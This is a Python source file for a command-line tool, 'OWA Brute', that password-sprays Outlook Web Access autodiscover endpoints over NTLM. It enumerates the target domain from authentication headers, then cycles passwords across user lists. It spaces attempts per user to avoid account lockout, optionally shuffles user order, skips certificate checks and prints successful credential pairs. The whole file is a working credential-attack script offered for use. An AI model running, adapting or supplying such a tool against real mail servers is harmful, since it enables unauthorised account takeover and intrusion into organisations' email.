#!/usr/bin/env python3

import argparse
import requests
from requests_ntlm import HttpNtlmAuth
import json
import base64
import random
import time
import sys
import warnings
warnings.filterwarnings('ignore')

def print_banner():
    print("+-+-+-+ +-+-+-+-+-+")
    print("|O|W|A| |B|R|U|T|E|")
    print("+-+-+-+ +-+-+-+-+-+")
    print("")

def get_domain(url):
    session = requests.Session()
    session.auth = HttpNtlmAuth('username','password', session) #domain\\username
    r = session.get(url, verify=False)
    print("Response code [%s]" % r.status_code)
    rheader = r.headers.get('www-authenticate')
    if rheader is not None and "NTLM" in rheader:
        print("Domain: %s " % rheader)
    else:
        print("Domain not found!")
        print("Headers:")
        d = r.headers
        for i in sorted(d, key=str.lower):
            print("%s : %s" % (i, d[i]))
    exit()

def brute_loop(url, users, passwords, domain, frequency, scramble):
    i = 0
    user_tracker = dict.fromkeys(users)
    for cur_pass in passwords:
        u_temp = list(users)
        if scramble:
            random.shuffle(u_temp)
        while len(u_temp) > 0:
            cur_u = u_temp.pop(0)
            last_attempt = user_tracker[cur_u]
            if last_attempt is None or (time.time() - last_attempt) >= frequency:
                attempt_login(domain, cur_u.rstrip(), cur_pass.rstrip(), url)
                user_tracker[cur_u] = time.time()
            else:
                sys.stdout.write("\r[\033[27mWaiting...\033[0m]")
                sys.stdout.flush()
                u_temp.append(cur_u)


def attempt_login(domain, username, password, url):
    session = requests.Session()
    session.auth = HttpNtlmAuth('%s\\%s' % (domain, username), password, session)
    r = session.get(url, verify=False)
    if r.status_code == 401:
        print("\r[\033[31mfail\033[0m] [%s\\%s:%s]" % (domain, username, password))
    else:
        print("\r[\033[32mSUCCESS\033[0m]--[%s\\%s:%s]" % (domain, username, password))

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="A horizontal brute forcing tool for OWA.")
    parser.add_argument("--domain", type=str, help="The target domain")
    parser.add_argument("--users", type=argparse.FileType('r'), help="File of user names (newline seperated).")
    parser.add_argument("--passwords", type=argparse.FileType('r'), help="File of passwords (newline seperated).")
    parser.add_argument("--freq", type=int, default=1300,help="Minimum number of seconds between password attempt of each user (default=1300/30 mins).")
    parser.add_argument("--scramble", action='store_true', default=False, help="Scramble the order of users on each iteration.")
    parser.add_argument("--enumerate", action='store_true', default=False, help="Enumerate the Domain name.")
    parser.add_argument("url", type=str, help="URL of OWA server autodiscover.")
    args = parser.parse_args()

    if args.enumerate:
        get_domain(args.url)
    else:
        users = args.users.readlines()
        passwords = args.passwords.readlines()
        brute_loop(args.url, users, passwords, args.domain, args.freq, args.scramble)
